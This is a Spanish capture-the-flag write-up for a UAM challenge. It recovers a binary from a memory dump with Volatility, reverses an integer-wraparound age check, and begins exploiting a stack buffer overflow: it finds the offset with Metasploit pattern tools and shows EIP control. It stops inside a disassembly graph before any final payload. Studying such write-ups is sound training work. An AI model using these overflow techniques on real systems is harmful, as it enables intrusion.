@@ -1,0 +1,715 @@
+-------------------------------------------------------------------------------
+WRITE-UP UAM UNIVERSO-MARVEL EPISODIO 1 - PARTE 2
+-------------------------------------------------------------------------------
+
+ ███▄ ▄███▓ ▄▄▄        ██████  ██▓
+▓██▒▀█▀ ██▒▒████▄    ▒██    ▒ ▓██▒
+▓██    ▓██░▒██  ▀█▄  ░ ▓██▄   ▒██▒
+▒██    ▒██ ░██▄▄▄▄██   ▒   ██▒░██░
+▒██▒   ░██▒ ▓█   ▓██▒▒██████▒▒░██░
+░ ▒░   ░  ░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░▓  
+░  ░      ░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░
+░      ░     ░   ▒   ░  ░  ░   ▒ ░
+       ░         ░  ░      ░   ░  
+Twitter: @masi_c64
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+
+EPISODIO 1 - 2ª PARTE
+Misión:
+Tras haber conseguido la localización de la base secreta de Hydra hemos infiltrado a un soldado en la organización el cuál se encuentra realizando las pruebas de reclutamiento.
+En la primera prueba no consigue resolver el formulario que le proponen, por lo que ha hecho una captura de la memoria RAM del equipo para ver si eres capaz de ayudarle.
+Deberás conseguir el programa y el servidor al que conecta para explotar el formulario y pasar al siguiente nivel.
+Mucha suerte soldado.
+Nick Furia.
+Enlace de descarga del dumpeo de memoria: https://drive.google.com/open?id=1Hbo8lqq9QPAJGNCRM4aE5jHcZhILuGTN
+Info: La flag tiene el formato UAM{md5}
+
+Como pista adicional, en el canal de UAM se nos advierte que en esta segunda prueba tendremos forensic-reversing-exploiting
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+
+Vamos a separar el Write-up en las tres partes.
+----------------
+ PARTE FORENSIC
+----------------
+En esta parte nos centraremos a sacar información del fichero con el dump de memoria.
+	Descargamos el dump de memoria y empezamos a investigar.
+	Nos dirigimos al volatility, sacamos todos los ficheros de la imagen
+	volatility -f image.raw --profile=Win7SP0x64 filescan >> files_UniversoMarvel.txt
+
+	Después de ver los usuarios que aparece, sacamos todos los ficheros que tengan Desktop y admin en su nombre, si quisiésemos hacerlo case-insensitive, pondríamos "-i" en los grep
+	cat files_UniversoMarvel.txt | grep Desktop | grep admin
+	Offset(P)            #Ptr   #Hnd Access Name
+	------------------ ------ ------ ------ ----
+	0x00000001285b4290      2      1 R--rwd \Device\HarddiskVolume1\Users\admin\Desktop
+	0x000000013d440370     16      0 R--rwd \Device\HarddiskVolume1\Users\admin\Links\Desktop.lnk
+	0x000000013d563f20     16      0 R--r-- \Device\HarddiskVolume1\Users\admin\Desktop\HydralarioHydra
+	0x000000013d939d10     15      0 R--r-d \Device\HarddiskVolume1\Users\admin\Desktop\netcat-1.11\nc64.exe
+	0x000000013dfcb730     16      0 RW---- \Device\HarddiskVolume1\Users\admin\Desktop\flag.txt
+	0x000000013e122360     16      0 R--rwd \Device\HarddiskVolume1\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini
+	0x000000013e1b0550     16      0 R--rwd \Device\HarddiskVolume1\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Desktop.ini
+	0x000000013e1b1600     16      0 R--rwd \Device\HarddiskVolume1\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Desktop.ini
+	0x000000013e1bb750     16      0 R--rwd \Device\HarddiskVolume1\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini
+	0x000000013e237650      1      1 R--rw- \Device\HarddiskVolume1\Users\admin\Desktop\netcat-1.11
+	0x000000013e39dd10      2      0 R--rwd \Device\HarddiskVolume1\Users\admin\Desktop\netcat-1.11\nc64.exe
+	0x000000013e3f05f0     15      0 R--rwd \Device\HarddiskVolume1\Users\admin\Desktop\desktop.ini
+	0x000000013ec611d0     15      0 R--r-d \Device\HarddiskVolume1\Users\admin\Desktop\netcat-1.11\nc.exe
+	0x000000013ef19950      2      1 R--rwd \Device\HarddiskVolume1\Users\admin\Desktop
+	0x000000013ff013d0     16      0 R--rwd \Device\HarddiskVolume1\Users\admin\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini
+
+	Nos llama la atención dos fiecheros:
+	0x000000013d563f20     16      0 R--r-- \Device\HarddiskVolume1\Users\admin\Desktop\HydralarioHydra
+	0x000000013dfcb730     16      0 RW---- \Device\HarddiskVolume1\Users\admin\Desktop\flag.txt
+
+	Con el volatility extraemos los ficheros HydralarioHydra y flag.txt con los offsets en el directorio rawfile/
+	root:~# volatility -f image.raw --profile=Win7SP0x64 dumpfiles -Q 0x000000013d563f20 --name -D rawfile/
+	root:~# volatility -f image.raw --profile=Win7SP0x64 dumpfiles -Q 0x000000013dfcb730 --name -D rawfile/
+
+
+	Revisamos el fichero flag.txt 
+	root:~# cat flag.txt 
+		UAM{EstaNoEsLaFlag}
+	La comprobamos en el portal... que bonito habría sido, pero esa no es la flag, ni pasandola a md5 ó_Ò
+
+	El fichero HydralarioHydra lo renombramos a hydra, revisamos el tipo de fichero que tenemos:
+	root:~# file ./hydra
+		./hydra: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c03cee4c7f44b1055031fd53980bd22e47873ab1, not stripped
+	Ya tenemos el fichero ejecutable, para la parte del reversing, aunque si hay exploiting, necesitaremos un servidor remoto donde se ejecute el mismo programa y podamos explotar la vulnerabilidad que encontremos en el fichero local.
+		
+	Nos llama la atención el netcat en el escritorio, con lo que revisamos con el volatility los procesos en ejecución, y al ver que está ejecutado, revisamos también las conexiones, descubriendo así el host remoto para la parte del exploiting.
+
+
+	Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          
+	------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
+	0xfffffa8003cd2990 System                    4      0     85      547 ------      0 2018-12-20 15:27:24 UTC+0000                                 
+	0xfffffa8005deb800 smss.exe                232      4      2       29 ------      0 2018-12-20 15:27:24 UTC+0000                                 
+	0xfffffa8005b092e0 csrss.exe               324    312      9      496      0      0 2018-12-20 15:27:28 UTC+0000                                 
+	0xfffffa8005b657c0 wininit.exe             376    312      3       74      0      0 2018-12-20 15:27:28 UTC+0000                                 
+	0xfffffa8005b6c060 csrss.exe               388    368     10      272      1      0 2018-12-20 15:27:28 UTC+0000                                 
+	0xfffffa8005bbbb30 winlogon.exe            436    368      5      113      1      0 2018-12-20 15:27:28 UTC+0000                                 
+	0xfffffa8005c6bb30 services.exe            472    376     10      212      0      0 2018-12-20 15:27:28 UTC+0000                                 
+	0xfffffa8005cde9e0 lsass.exe               480    376      7      566      0      0 2018-12-20 15:27:28 UTC+0000                                 
+	0xfffffa8005cefb30 lsm.exe                 488    376     10      144      0      0 2018-12-20 15:27:28 UTC+0000                                 
+	0xfffffa8005e96b30 svchost.exe             600    472     10      357      0      0 2018-12-20 15:27:29 UTC+0000                                 
+	0xfffffa8005f1d890 vmacthlp.exe            660    472      3       53      0      0 2018-12-20 15:27:29 UTC+0000                                 
+	0xfffffa8005f48b30 svchost.exe             692    472      8      268      0      0 2018-12-20 15:27:29 UTC+0000                                 
+	0xfffffa8005f8ab30 svchost.exe             744    472     20      480      0      0 2018-12-20 15:27:29 UTC+0000                                 
+	0xfffffa8004d59780 svchost.exe             876    472     19      439      0      0 2018-12-20 15:27:30 UTC+0000                                 
+	0xfffffa8005a8bb30 svchost.exe             916    472     30      926      0      0 2018-12-20 15:27:31 UTC+0000                                 
+	0xfffffa8005a8db30 svchost.exe             276    472     21      715      0      0 2018-12-20 15:27:31 UTC+0000                                 
+	0xfffffa800612caa0 svchost.exe             264    472     16      477      0      0 2018-12-20 15:27:31 UTC+0000                                 
+	0xfffffa8005c25340 spoolsv.exe            1120    472     13      315      0      0 2018-12-20 15:27:32 UTC+0000                                 
+	0xfffffa8005de4060 taskhost.exe           1164    472      9      205      1      0 2018-12-20 15:27:33 UTC+0000                                 
+	0xfffffa8005e45060 svchost.exe            1180    472     18      324      0      0 2018-12-20 15:27:33 UTC+0000                                 
+	0xfffffa8005ff6060 dwm.exe                1252    876      5      138      1      0 2018-12-20 15:27:33 UTC+0000                                 
+	0xfffffa8005c4e060 explorer.exe           1264   1224     42     1157      1      0 2018-12-20 15:27:33 UTC+0000                                 
+	0xfffffa8005f332e0 vmtoolsd.exe           1380   1264      8      266      1      0 2018-12-20 15:27:34 UTC+0000                                 
+	0xfffffa8005253b30 svchost.exe            1536    472     16      278      0      0 2018-12-20 15:27:38 UTC+0000                                 
+	0xfffffa80199fd910 VGAuthService.         1616    472      3       86      0      0 2018-12-20 15:27:38 UTC+0000                                 
+	0xfffffa8004f63b30 vmtoolsd.exe           1652    472      8      326      0      0 2018-12-20 15:27:38 UTC+0000                                 
+	0xfffffa80064dcb30 svchost.exe            1968    472      6       92      0      0 2018-12-20 15:27:40 UTC+0000                                 
+	0xfffffa8006508060 TPAutoConnSvc.          836    472      9      130      0      0 2018-12-20 15:27:41 UTC+0000                                 
+	0xfffffa80065515f0 WmiPrvSE.exe           1456    600     10      199      0      0 2018-12-20 15:27:41 UTC+0000                                 
+	0xfffffa800659c630 SearchIndexer.         1064    472     13      649      0      0 2018-12-20 15:27:41 UTC+0000                                 
+	0xfffffa80065ce060 dllhost.exe            1944    472     13      190      0      0 2018-12-20 15:27:42 UTC+0000                                 
+	0xfffffa80059de920 TPAutoConnect.         2460    836      3      109      1      0 2018-12-20 15:27:55 UTC+0000                                 
+	0xfffffa800672a480 conhost.exe            2492    388      1       32      1      0 2018-12-20 15:27:56 UTC+0000                                 
+	0xfffffa8006076910 msdtc.exe              2520    472     12      146      0      0 2018-12-20 15:27:57 UTC+0000                                 
+	0xfffffa80067ae060 wmpnetwk.exe           2752    472      9      208      0      0 2018-12-20 15:28:01 UTC+0000                                 
+	0xfffffa80080a8a30 sppsvc.exe              384    472      4      146      0      0 2018-12-20 15:29:40 UTC+0000                                 
+	0xfffffa80053faa30 svchost.exe            2716    472     13      339      0      0 2018-12-20 15:29:40 UTC+0000                                 
+	0xfffffa80058485f0 audiodg.exe            2964    744      6      130      0      0 2018-12-20 15:42:07 UTC+0000                                 
+	0xfffffa80063e3a70 SearchProtocol         3068   1064      8      279      0      0 2018-12-20 15:47:15 UTC+0000                                 
+	0xfffffa8006076060 SearchFilterHo          580   1064      5       83      0      0 2018-12-20 15:47:15 UTC+0000                                 
+	0xfffffa8005f2bb30 powershell.exe         2304   1264      9      359      1      0 2018-12-20 15:47:27 UTC+0000                                 
+	0xfffffa80069677b0 conhost.exe            1312    388      2       53      1      0 2018-12-20 15:47:27 UTC+0000                                 
+		0xfffffa800685b860 nc64.exe               1940   2304      2       72      1      0 2018-12-20 15:47:56 UTC+0000                                 
+	0xfffffa800697d060 DumpIt.exe              864   1264      2       43      1      1 2018-12-20 15:47:59 UTC+0000                                 
+	0xfffffa800697f7c0 conhost.exe            1992    388      2       50      1      0 2018-12-20 15:47:59 UTC+0000    
+
+	root:~/UAM/UAM-UM-01_2# volatility -f image.raw --profile=Win7SP0x64 netscan
+	Volatility Foundation Volatility Framework 2.6
+	Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
+	0x126e614b0        UDPv6    fe80::8900:9d78:bbec:d3f8:546  *:*                                   744      svchost.exe    2018-12-20 15:41:55 UTC+0000
+	0x13ba99cb0        UDPv4    0.0.0.0:5355                   *:*                                   264      svchost.exe    2018-12-20 15:42:45 UTC+0000
+	0x13ba99cb0        UDPv6    :::5355                        *:*                                   264      svchost.exe    2018-12-20 15:42:45 UTC+0000
+	0x13d563690        UDPv4    172.16.233.139:1900            *:*                                   1536     svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d565010        UDPv4    0.0.0.0:3702                   *:*                                   1536     svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13d565010        UDPv6    :::3702                        *:*                                   1536     svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13d565690        UDPv4    0.0.0.0:3702                   *:*                                   276      svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13d566df0        UDPv4    0.0.0.0:3702                   *:*                                   276      svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13d57b010        UDPv4    127.0.0.1:1900                 *:*                                   1536     svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d57f450        UDPv6    ::1:1900                       *:*                                   1536     svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d580390        UDPv4    172.16.233.139:60863           *:*                                   1536     svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d586d70        UDPv6    fe80::8900:9d78:bbec:d3f8:1900 *:*                                   1536     svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d586ec0        UDPv4    127.0.0.1:60864                *:*                                   1536     svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d587cf0        UDPv6    ::1:60862                      *:*                                   1536     svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d589010        UDPv6    fe80::8900:9d78:bbec:d3f8:60861 *:*                                   1536     svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d594930        UDPv4    0.0.0.0:3702                   *:*                                   1536     svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13d5b21c0        UDPv4    0.0.0.0:60866                  *:*                                   276      svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d5b21c0        UDPv6    :::60866                       *:*                                   276      svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d5b2bb0        UDPv4    0.0.0.0:60865                  *:*                                   276      svchost.exe    2018-12-20 15:28:09 UTC+0000
+	0x13d7663c0        UDPv4    0.0.0.0:5355                   *:*                                   264      svchost.exe    2018-12-20 15:42:45 UTC+0000
+	0x13d5b9cf0        TCPv4    -:0                            56.187.168.5:0       CLOSED           276      svchost.exe    
+	0x13d8a0840        UDPv4    172.16.233.139:137             *:*                                   4        System         2018-12-20 15:28:01 UTC+0000
+	0x13d8a1c20        UDPv4    172.16.233.139:138             *:*                                   4        System         2018-12-20 15:28:01 UTC+0000
+	0x13db26010        UDPv4    0.0.0.0:3702                   *:*                                   1536     svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13db26010        UDPv6    :::3702                        *:*                                   1536     svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13dc74530        UDPv4    0.0.0.0:57707                  *:*                                   276      svchost.exe    2018-12-20 15:28:15 UTC+0000
+	0x13dd65820        UDPv4    0.0.0.0:0                      *:*                                   264      svchost.exe    2018-12-20 15:27:57 UTC+0000
+	0x13dd65820        UDPv6    :::0                           *:*                                   264      svchost.exe    2018-12-20 15:27:57 UTC+0000
+	0x13d84cd90        TCPv4    0.0.0.0:445                    0.0.0.0:0            LISTENING        4        System         
+	0x13d84cd90        TCPv6    :::445                         :::0                 LISTENING        4        System         
+	0x13d881ef0        TCPv4    172.16.233.139:139             0.0.0.0:0            LISTENING        4        System         
+	0x13d895010        TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        480      lsass.exe      
+	0x13d8959e0        TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        480      lsass.exe      
+	0x13d8959e0        TCPv6    :::49155                       :::0                 LISTENING        480      lsass.exe      
+	0x13da99550        TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        916      svchost.exe    
+	0x13df74910        TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        692      svchost.exe    
+	0x13df7def0        TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        692      svchost.exe    
+	0x13df7def0        TCPv6    :::135                         :::0                 LISTENING        692      svchost.exe    
+	0x13df8e950        TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        376      wininit.exe    
+	0x13df8f940        TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        376      wininit.exe    
+	0x13df8f940        TCPv6    :::49152                       :::0                 LISTENING        376      wininit.exe    
+	0x13e1279a0        TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        744      svchost.exe    
+		0x13d880880        TCPv4    172.16.233.139:49166           34.247.69.86:9009    ESTABLISHED      1940     nc64.exe       
+	0x13e1faaf0        TCPv6    -:0                            388b:f405:80fa:ffff:388b:f405:80fa:ffff:0 CLOSED           1        @??????       
+	0x13e2a5a10        UDPv4    0.0.0.0:3702                   *:*                                   276      svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13e2a5a10        UDPv6    :::3702                        *:*                                   276      svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13e2a7290        UDPv4    0.0.0.0:3702                   *:*                                   276      svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13e2a7290        UDPv6    :::3702                        *:*                                   276      svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13e78b010        UDPv4    0.0.0.0:54331                  *:*                                   1536     svchost.exe    2018-12-20 15:27:39 UTC+0000
+	0x13e78b540        UDPv4    0.0.0.0:54332                  *:*                                   1536     svchost.exe    2018-12-20 15:27:39 UTC+0000
+	0x13e78b540        UDPv6    :::54332                       *:*                                   1536     svchost.exe    2018-12-20 15:27:39 UTC+0000
+	0x13e7d0010        UDPv4    0.0.0.0:57708                  *:*                                   276      svchost.exe    2018-12-20 15:28:15 UTC+0000
+	0x13e7d0010        UDPv6    :::57708                       *:*                                   276      svchost.exe    2018-12-20 15:28:15 UTC+0000
+	0x13e7630e0        TCPv4    0.0.0.0:5357                   0.0.0.0:0            LISTENING        4        System         
+	0x13e7630e0        TCPv6    :::5357                        :::0                 LISTENING        4        System         
+	0x13e7895f0        TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        472      services.exe   
+	0x13e78e010        TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        472      services.exe   
+	0x13e78e010        TCPv6    :::49156                       :::0                 LISTENING        472      services.exe   
+	0x13eb0c470        TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        744      svchost.exe    
+	0x13eb0c470        TCPv6    :::49153                       :::0                 LISTENING        744      svchost.exe    
+	0x13e2f6010        TCPv6    -:0                            38bb:a805:80fa:ffff:38bb:a805:80fa:ffff:0 CLOSED           276      svchost.exe    
+	0x13ef276b0        UDPv4    0.0.0.0:3702                   *:*                                   1536     svchost.exe    2018-12-20 15:29:05 UTC+0000
+	0x13f0e8a90        TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        916      svchost.exe    
+	0x13f0e8a90        TCPv6    :::49154                       :::0                 LISTENING        916      svchost.exe    
+	0x13f459010        TCPv4    -:49162                        224.0.0.22:80        CLOSED           1264     explorer.exe 
+
+
+	Con esto ya tenemos los ficheros hydra y flag.exe, además de la dirección remota del servidor: 34.247.69.86:9009
+
+-----------------
+ PARTE REVERSING
+-----------------
+Una vez sacada toda la información que nos parece útil, seguimos con la parte del reversing, para saber como funciona el programa que hemos descargado.
+
+	[0x08414216]> VV @ sym.check_age (nodes 9 edges 11 zoom 100%) BB-NORM mouse:canvas-y mov-speed:5
+			 .----------------------------------------.
+			 | [0x8414216]                            |
+			 | (fcn) sym.check_age 119                |
+			 |   sym.check_age ();                    |
+			 | ; var int local_10h @ ebp-0x10         |
+			 | ; var int local_ah @ ebp-0xa           |
+			 | ; var int local_4h @ ebp-0x4           |
+			 | ; CALL XREF from main (0x84143fc)      |
+			 | push ebp                               |
+			 | mov ebp, esp                           |
+			 | push ebx                               |
+			 | sub esp, 0x14                          |
+			 | call sym.__x86.get_pc_thunk.bx;[ga]    |
+			 | add ebx, 0x1dde                        |
+			 | sub esp, 8                             |
+			 | lea eax, dword [local_10h]             |
+			 | push eax                               |
+			 | lea eax, dword [ebx - 0x1b30]          |
+			 | push eax                               |
+			 | ; int scanf(const char *format)        |
+			 | call sym.imp.__isoc99_scanf;[gb]       |
+			 | add esp, 0x10                          |
+			 | mov eax, dword [local_10h]             |
+			 | cmp eax, 0x1869f                       | <- 99999
+			 | jg 0x8414250;[gc]                      |
+			 `----------------------------------------'
+	Hacemos un par de pruebas y vemos que aparece un campo Edad: y que según modificamos el valor 99999 nos va dando otros valores, y hacemos que llegue a 0
+
+		root:~# ./hydra
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+		99999
+
+		Edad: 34463
+		¡Un verdadero agente no revela su edad! ¡Eres un farsante!
+
+		root:~# ./hydra 
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+		99998
+
+		Edad: 34462
+
+		root:~# ./hydra 
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+		99997
+
+		Edad: 34461
+
+	Hacemos un cálculo para saber cual sería el valor en edad 0: 99999 - 34463 = 65536
+	Probamos ese valor en el programa
+
+		root:~# ./hydra 
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+		65536
+
+		Edad: 0
+		Parece que tienes madera de agente... hagamos una ultima comprobacion...
+		Cuentame el secreto y yo te contare el mio: 
+
+
+	Ahora vamos a comprobra el buffer overflow:	
+		root:~# ./hydra
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+		65536
+
+		Edad: 0
+		Parece que tienes madera de agente... hagamos una ultima comprobacion...
+		Cuentame el secreto y yo te contare el mio: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+		Segmentation fault
+	
+BOOM!!! tenemos BOF, a partir de aquí viene el exploiting!
+
+------------------
+ PARTE EXPLOITING
+------------------
+A partir de aquí debemos encontrar una manera de sacar información utilizando el bufferoverflow descubierto. 
+
+	Revisamos con el framework de metasploit donde está la entrada buffer overflow, una vez ponemos el pattern en el radare2 y vemos la salida
+
+		root:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
+		Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+		Iniciamos radare2 para comprobar la dirección del BOF 
+		root:# r2 -Ad ./hydra
+		[0xf7f42250]> dc
+
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+		65536
+
+		Edad: 0
+		Parece que tienes madera de agente... hagamos una ultima comprobacion...
+		Cuentame el secreto y yo te contare el mio: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+		child stopped with signal 11
+		[+] SIGNAL 11 errno=0 addr=0x37614136 code=1 ret=0
+		[0x37614136]> 
+
+	Introducimos la dirección de memoria en el framework para saber a que posición es el BOF
+		root:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136
+		[*] Exact match at offset 20
+
+	Comprobamos una vez más introduciendo un patrón propio, para saber donde están los saltos.
+		root:# r2 -Ad ./hydra
+		Wait event received by different pid 3106
+		Process with PID 3108 started...
+		File dbg:///root/hydra  reopened in read-write mode
+		= attach 3108 3108
+		3108
+		[0xf7ef1250]> dc
+
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+		65536
+
+		Edad: 0
+		Parece que tienes madera de agente... hagamos una ultima comprobacion...
+		Cuentame el secreto y yo te contare el mio: AAAAAAAAAAAAAAAABBBBCCCCDDDD
+		child stopped with signal 11
+		[+] SIGNAL 11 errno=0 addr=0x43434343 code=1 ret=0
+		[0x43434343]> dr
+		eax = 0x00000001
+		ebx = 0x41414141
+		ecx = 0x00000001
+		edx = 0xf7ebe89c
+		esi = 0xf7ebd000
+		edi = 0x00000000
+		esp = 0xfff35a80
+		ebp = 0x42424242
+		eip = 0x43434343
+		eflags = 0x00010286
+		oeax = 0xffffffff
+		[0x43434343]> 
+
+		A(hex)=41
+		B(hex)=42
+		C(hex)=43
+		En el caracter 16 se produce buffer overflow, hasta el 20 escribimos el ebx hasta el 24 escribimos el ebp y en el 28 el eip, que finalmente es el que queremos si vamos a ejecutar alguna otra función.
+
+	Ahora vamos a investigar el ejecutable local, buscando donde podría estar la información que necesitamos. En un primer momento, buscamos alguna función que pudiese estar oculta.
+
+		Dentro del radare2 revisamos las funciones y el grafico de bloques
+		[0x084143c8]> afl
+		0x080483ec    3 35           sym._init
+		0x08048420    1 6            sym.imp.getline
+		0x08048430    1 6            sym.imp.printf
+		0x08048440    1 6            sym.imp.fclose
+		0x08048450    1 6            sym.imp.strcpy
+		0x08048460    1 6            sym.imp.puts
+		0x08048470    1 6            sym.imp.exit
+		0x08048480    1 6            sym.imp.__libc_start_main
+		0x08048490    1 6            sym.imp.fopen
+		0x080484a0    1 6            sym.imp.__isoc99_scanf
+		0x080484b0    1 6            sub.__gmon_start_4b0
+		0x08414100    1 50           entry0
+		0x08414133    1 4            fcn.08414133
+		0x08414140    1 2            sym._dl_relocate_static_pie
+		0x08414150    1 4            sym.__x86.get_pc_thunk.bx
+		0x08414160    4 50   -> 41   sym.deregister_tm_clones
+		0x084141a0    4 58   -> 54   sym.register_tm_clones
+		0x084141e0    3 34   -> 31   sym.__do_global_dtors_aux
+		0x08414210    1 6            entry1.init
+		 0x08414216    7 119          sym.check_age
+		 0x0841428d    1 64           sym.tell_me_a_secret
+		 0x084142cd    1 74           sym.a
+		 0x08414317    5 177          sym.read_flag
+		0x084143c8    4 129          main
+		0x08414450    4 93           sym.__libc_csu_init
+		0x084144b0    1 2            sym.__libc_csu_fini
+		0x084144b4    1 20           sym._fini
+
+		[0x084143c8]> VV @ main (nodes 4 edges 4 zoom 100%) BB-NORM mouse:canvas-y mov-speed:5
+						   .-------------------------------------------------------.                                                                           
+						   | [0x8414317]                                           |                                                                           
+						   | (fcn) sym.read_flag 177                               |                                                                           
+						   |   sym.read_flag ();                                   |                                                                           
+						   | ; var int local_18h @ ebp-0x18                        |                                                                           
+						   | ; var char *src @ ebp-0x14                            |                                                                           
+						   | ; var unsigned int local_10h @ ebp-0x10               |                                                                           
+						   | ; var file*stream @ ebp-0xc                           |                                                                           
+						   | ; var int local_4h @ ebp-0x4                          |                                                                           
+						   | ; CALL XREF from main (0x84143e5)                     |                                                                           
+						   | push ebp                                              |                                                                           
+						   | mov ebp, esp                                          |                                                                           
+						   | push ebx                                              |                                                                           
+						   | sub esp, 0x14                                         |                                                                           
+						   | call sym.__x86.get_pc_thunk.bx;[ga]                   |                                                                           
+						   | add ebx, 0x1cdd                                       |                                                                           
+						   | mov dword [src], 0                                    |                                                                           
+						   | mov dword [local_18h], 0                              |                                                                           
+						   | sub esp, 8                                            |                                                                           
+						   | lea eax, dword [ebx - 0x1ad7]                         |                                                                           
+						   | ; const char *mode                                    |                                                                           
+						   | push eax                                              |                                                                           
+						   | lea eax, dword [ebx - 0x1ad5]                         |                                                                           
+						   | ; const char *filename                                |                                                                           
+						   | push eax                                              |                                                                           
+						   | ; file*fopen(const char *filename, const char *mode)  |                                                                           
+						   | call sym.imp.fopen;[gb]                               |                                                                           
+						   | add esp, 0x10                                         |                                                                           
+						   | mov dword [stream], eax                               |                                                                           
+						   | cmp dword [stream], 0                                 |                                                                           
+						   | jne 0x8414375;[gc]                                    |                                                                           
+						   `-------------------------------------------------------'                                                                           
+								   f t                                                                                                                         
+								   | |                                                                                                                         
+								   | '----------------------.                                                                                                  
+				.------------------'                        |                                                                                                  
+				|                                           |                                                                                                  
+			.--------------------------------------.    .--------------------------------------------.                                                         
+			|  0x8414359 [gg]                      |    |  0x8414375 [gc]                            |                                                         
+			| sub esp, 0xc                         |    | ; CODE XREF from sym.read_flag (0x8414357) |                                                         
+			| lea eax, dword [ebx - 0x1acc]        |    | sub esp, 4                                 |                                                         
+			| ; const char *format                 |    | push dword [stream]                        |                                                         
+			| push eax                             |    | lea eax, dword [local_18h]                 |                                                         
+			| ; int printf(const char *format)     |    | push eax                                   |                                                         
+			| call sym.imp.printf;[ge]             |    | lea eax, dword [src]                       |                                                         
+			| add esp, 0x10                        |    | push eax                                   |                                                         
+			| sub esp, 0xc                         |    | call sym.imp.getline;[gh]                  |                                                         
+			| ; int status                         |    | add esp, 0x10                              |                                                         
+			| ; 1                                  |    | mov dword [local_10h], eax                 |         
+			| push 1                               |    | cmp dword [local_10h], -1                  |                                                        
+			| ; void exit(int status)              |    | jne 0x841439e;[gi]                         |                                                        
+			| call sym.imp.exit;[gf]               |    `--------------------------------------------'                                                        
+			`--------------------------------------'            f t                                                                                           
+																| |                                                                                           
+																| |                                                                                           
+																| '-------------.                                                                             
+												.---------------'               |                                                                             
+												|                               |                                                                             
+											.---------------------------.   .----------------------------------------------.                                  
+											|  0x8414394 [gj]           |   |  0x841439e [gi]                              |                                  
